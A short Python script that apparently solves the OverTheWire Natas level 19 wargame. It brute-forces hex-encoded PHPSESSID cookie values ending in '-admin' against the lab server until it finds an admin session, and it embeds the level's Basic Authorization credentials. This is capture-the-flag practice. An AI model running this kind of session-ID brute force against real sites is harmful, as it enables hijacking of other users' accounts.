#! /bin/python3

import requests
import re
import binascii

def urlconn(var) :
    url = 'http://natas19.natas.labs.overthewire.org/index.php'
    headers = {'Authorization' : 'Basic bmF0YXMxOTo0SXdJcmVrY3VabEE5T3NqT2tvVXR3VTZsaG9rQ1BZcw==', 'Cookie' : var}
    payload = {'debug' : '1', 'username' : 'admin', 'password' : 'fgdsg'}

    r = requests.get(url,headers=headers,data=payload)

    return (re.findall('regular', r.text, re.MULTILINE))

str1 = 'PHPSESSID='

for i in range(1000) :
    str2 = ''
    for j in str(i) :
        str2 = str2 + str(3) + str(j)
    str3 = str1 + str2 + '2d61646d696e'
    print (str(i) + " " + str3 + " : ", end='')
    if urlconn(str3) :
        print ("not this one")
    else :
        print (" Got it")
        break


